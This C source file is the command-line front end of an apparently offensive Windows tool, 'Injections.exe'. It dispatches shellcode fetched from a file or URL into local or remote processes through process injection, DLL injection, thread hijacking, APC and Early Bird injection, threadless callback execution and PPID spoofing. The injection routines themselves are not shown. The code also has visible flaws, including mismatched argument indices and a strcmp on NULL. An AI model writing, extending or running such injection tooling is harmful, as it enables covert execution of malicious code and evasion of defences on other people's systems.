#include <stdio.h>

#include "Common.h"
#include "Structs.h"

int PrintHelp(char* argv0, char* function)
{
	if (strcmp(function, "process") == 0)
		printf("[!] Usage: %s %s <local/remote> [ProcessName] [ProcessEnumerationMethod] [MemoryType] <file/URL shellcode>\n", argv0, function);
	else if (strcmp(function, "thread") == 0)
		printf("[!] Usage: %s %s <local/remote> [ProcessName] [ThreadEnumerationMethod] <file/URL shellcode>\n", argv0, function);
	else if (strcmp(function, "apc") == 0)
		printf("[!] Usage: %s %s <local/remote/hijack/earlybird> [ProcessName] [EarlyBirdMethod] [alertable/suspended [AlertableFunction]] <file/URL shellcode>\n", argv0, function);
	else if (strcmp(function, "threadless") == 0)
		printf("[!] Usage: %s %s <callback> <file/URL shellcode>\n", argv0, function);
	else if (strcmp(function, "ppidspoof") == 0)
		printf("[!] Usage: %s %s <ParentProcessName> <ProcessName> <file/URL shellcode>", argv0, function);
	else
	{
		printf("[!] Usage: %s <Function> <arguments>\n", argv0);
		printf("[i] <Function> Can Be : \n");
		printf("\t1.>>> \"process\"\t\t\t\t::: Process Injection\n");
		printf("\t2.>>> \"thread\"\t\t\t\t::: Thread Hijacking\n");
		printf("\t3.>>> \"apc\"\t\t\t\t::: Apc Injection\n");
		printf("\t4.>>> \"threadless\"\t\t\t::: Threadless Injection\n");
		printf("\t5.>>> \"ppidspoof\"\t\t\t::: PPID Spoofing Injection\n");
	}

	if (strcmp(function, "process") == 0)
	{
		printf("\n[i] [ProcessEnumerationMethod] Can Be : \n");
		printf("\t1.>>> \"snapshot\"\t\t\t::: Using CreateToolhelp32Snapshot WinAPI\n");
		printf("\t2.>>> \"enumprocesses\"\t\t\t::: Using EnumProcesses WinAPI\n");
		printf("\t3.>>> \"ntquerysysteminformation\"\t::: Using NtQuerySystemInformation NativeAPI\n");

		printf("\n[i] [MemoryType] Can Be : \n");
		printf("\t1.>>> \"private\"\t\t\t::: Using VirtualProtect/Ex WinAPIs\n");
		printf("\t2.>>> \"mapped\"\t\t\t::: Using MapViewOfFile WinAPIs\n");
		printf("\t3.>>> \"stomping\"\t\t::: Using Function Stomping technique\n");
	}
	else if (strcmp(function, "thread") == 0)
	{
		printf("\n[i] [ThreadEnumerationMethod] Can Be : \n");
		printf("\t1.>>> \"snapshot\"\t\t\t::: Using CreateToolhelp32Snapshot WinAPI\n");
		printf("\t2.>>> \"ntquerysysteminformation\"\t::: Using NtQuerySystemInformation NativeAPI\n");
	}
	else if (strcmp(function, "apc") == 0)
	{
		printf("\n[i] [AlertableFunction] Can Be : \n");
		printf("\t1.>>> \"sleepex\"\t\t\t\t::: Using SleepEx WinAPI\n");
		printf("\t2.>>> \"waitforsingleobjectex\"\t\t::: Using WaitForSingleObjectEx WinAPI\n");
		printf("\t3.>>> \"waitformultipleobjectsex\"\t::: Using WaitForMultipleObjectsEx NativeAPI\n");
		printf("\t4.>>> \"msgwaitformultipleobjectsex\"\t::: Using MsgWaitForMultipleObjectsEx NativeAPI\n");
		printf("\t5.>>> \"signalobjectandwait\"\t\t::: Using SignalObjectAndWait NativeAPI\n");

		printf("\n[i] [EarlyBirdMethod] Can Be : \n");
		printf("\t1.>>> \"suspended\"\t\t\t\t::: Using CREATE_SUSPENDED process creation flag\n");
		printf("\t2.>>> \"debug\"\t\t::: Using DEBUG_PROCESS process creation flag\n");
	}

	return 1;
}

int main(int argc, char *argv[])
{
	if (argc < 2)
		return PrintHelp(argv[0], "");
	else if (argc < 3)
		return PrintHelp(argv[0], argv[1]);

	// Injections.exe process <local/remote> [ProcessName] [ProcessEnumerationMethod] [MemoryType] <file/URL shellcode>
	if (strcmp(argv[1], "process") == 0)
	{
		int MemoryType = NULL;

		// Memory type
		if (strcmp(argv[argc - 2], "private") == 0)
			MemoryType = PRIVATE;
		else if (strcmp(argv[argc - 2], "mapped") == 0)
			MemoryType = MAPPED;
		else if (strcmp(argv[argc - 2], "stomping") == 0)
			MemoryType = STOMPING;
		else
		{
			printf("[!] Invalid memory type specified!\n");
			return PrintHelp(argv[0], argv[1]);
		}

		// Local process injection
		if (argc == 5 && strcmp(argv[2], "local") == 0)
		{
			if (IsDll(argv[4]))
			{
				printf("[i] Performing local DLL injection\n");
				return LocalProcessDllInjection(argv[3]);
			}

			printf("[i] Performing local process injection with %s memory type!\n", argv[3]);
			return LocalProcessInjection(MemoryType, argv[4]);
		}

		// Remote process injection
		else if (argc == 7 && strcmp(argv[2], "remote") == 0)
		{
			int EnumerationMethod = NULL;

			// Determine the chosen enumeration method
			if (strcmp(argv[4], "snapshot") == 0)
				EnumerationMethod = SNAPSHOT;
			else if (strcmp(argv[4], "enumprocesses") == 0)
				EnumerationMethod = ENUMPROCESSES;
			else if (strcmp(argv[4], "ntquerysysteminformation") == 0)
				EnumerationMethod = NTQUERYSYSTEMINFORMATION;
			else
			{
				printf("[!] Invalid enumeration method supplied!\n");
				return PrintHelp(argv[0], argv[1]);
			}

			if (IsDll(argv[argc-1]))
			{
				printf("[i] Performing remote DLL injection to %s with enumeration method %s\n", argv[3], argv[4]);
				return RemoteProcessDllInjection(MemoryType, argv[3], EnumerationMethod, argv[argc-1]);
			}

			printf("[i] Performing remote process injection to %s with enumeration method %s\n", argv[3], argv[4]);
			return RemoteProcessInjection(MemoryType, argv[3], EnumerationMethod, argv[argc-1]);
		}

		else
			return PrintHelp(argv[0], argv[1]);
	}

	// Injections.exe thread <local/remote> [ProcessName] [ThreadEnumerationMethod] <file/URL shellcode>
	else if (strcmp(argv[1], "thread") == 0)
	{
		if (strcmp(argv[2], "local") == 0 && argv[3])
		{
			printf("[i] Performing local thread hijacking\n");
			return LocalThreadHijacking(argv[3], GetCurrentThreadId());
		}

		else if (strcmp(argv[2], "remote") == 0 && argv[3] && argv[4])
		{
			int EnumerationMethod = NULL;
			
			if (strcmp(argv[4], "snapshot") == 0)
				EnumerationMethod = SNAPSHOT;
			else if (strcmp(argv[4], "ntquerysysteminformation") == 0)
				EnumerationMethod = NTQUERYSYSTEMINFORMATION;
			else
			{
				printf("[!] Invalid thread enumeration method supplied!\n");
				return PrintHelp(argv[0], argv[1]);
			}

			printf("[i] Performing remote thread hijacking to %s with thread enumeration method %s\n", argv[3], argv[4]);
			return RemoteThreadHijacking(argv[3], EnumerationMethod, argv[5]);
		}

		else
			return PrintHelp(argv[0], argv[1]);
	}

	// Injections.exe apc <local/remote/hijack/earlybird> [ProcessName] [EarlyBirdMethod] [alertable/suspended [AlertableFunction]] <file/URL shellcode>
	else if (strcmp(argv[1], "apc") == 0)
	{
		DWORD dwAlertableFunction = NULL;
		BOOL bRemote = TRUE ? strcmp(argv[2], "remote") == 0 : FALSE;
		BOOL bHijack = TRUE ? strcmp(argv[2], "hijack") == 0 : FALSE;
		BOOL bEarlyBird = TRUE ? strcmp(argv[2], "earlybird") == 0 : FALSE;
		BOOL bAlertable = TRUE ? (!bHijack && !bEarlyBird && strcmp(argv[argc - 3], "alertable") == 0) : FALSE;

		if (bAlertable && argv[argc-2])
		{
			bAlertable = TRUE;
			if (strcmp(argv[argc-2], "sleepex") == 0)
				dwAlertableFunction = SLEEPEX;
			else if (strcmp(argv[argc - 2], "waitforsingleobjectex") == 0)
				dwAlertableFunction = WAITFORSINGLEOBJECTEX;
			else if (strcmp(argv[argc - 2], "waitformultipleobjectsex") == 0)
				dwAlertableFunction = WAITFORMULTIPLEOBJECTSEX;
			else if (strcmp(argv[argc - 2], "msgwaitformultipleobjectsex") == 0)
				dwAlertableFunction = MSGWAITFORMULTIPLEOBJECTSEX;
			else if (strcmp(argv[argc - 2], "signalobjectandwait") == 0)
				dwAlertableFunction = SIGNALOBJECTANDWAIT;
			else
			{
				printf("[!] Invalid alertable function selected!\n");
				return PrintHelp(argv[0], argv[1]);
			}
		}

		if (bRemote)
		{
			if (bAlertable)
			{
				printf("[!] Remote APC injection with CreateRemoteThread is not available as it's useless. Consider APC Hijacking or Early Bird APC!\n");
				return 1;
			}

			printf("[i] Performing remote APC injection in %s process with suspended thread!\n", argv[3]);
			ApcInjection(FALSE, dwAlertableFunction, argv[3], argv[argc-1]);
		}
		else if (bHijack && argc == 5)
		{
			printf("[i] Performing APC hijacking against %s process!\n", argv[3]);
			ApcHijacking(argv[3], argv[argc - 1]);
		}
		else if (bEarlyBird && argc == 6)
		{
			if (strcmp(argv[4], "suspended") == 0)
			{
				printf("[i] Performing Early Bird APC injection with a suspended process!\n");
				EarlyBirdApcInjection(CREATE_SUSPENDED, argv[3], argv[argc - 1]);
			}
			else if (strcmp(argv[4], "debug") == 0)
			{
				printf("[i] Performing Early Bird APC injection with a debug process!\n");
				EarlyBirdApcInjection(DEBUG_PROCESS, argv[3], argv[argc - 1]);
			}
			else
			{
				printf("[!] Invalid EarlyBirdMethod input!\n");
				return PrintHelp(argv[0], argv[1]);
			}
		}
		else
		{
			if (bAlertable)
				printf("[i] Performing local APC injection with alertable thread!\n");
			else
				printf("[i] Performing local APC injection with suspended thread!\n");
			ApcInjection(bAlertable, dwAlertableFunction, NULL, argv[argc - 1]);
		}
	}

	// Injections.exe threadless <callback> <file/URL shellcode>
	else if (argc == 4 && strcmp(argv[1], "threadless") == 0)
	{
		if (strcmp(argv[2], "callback") == 0)
		{
			printf("[i] Performing threadless execution using a callback function!\n");
			CallbackFunction(argv[argc - 1]);
		}
		else
		{
			printf("[!] Invalid threadless method!\n");
			return PrintHelp(argv[0], argv[1]);
		}
	}

	// Injections.exe ppidspoof <ParentProcessName> <ProcessName> <file/URL shellcode>
	else if (argc == 5 && strcmp(argv[1], "ppidspoof") == 0)
	{
		printf("[i] Performing PPID Spoofing execution!\n");
		PPIDSpoofing(argv[3], argv[2], argv[4]);
	}

	else
	{
		printf("[!] \"%s\" is not valid input...\n", argv[1]);
		return PrintHelp(argv[0], NULL);
	}

	return 0;
}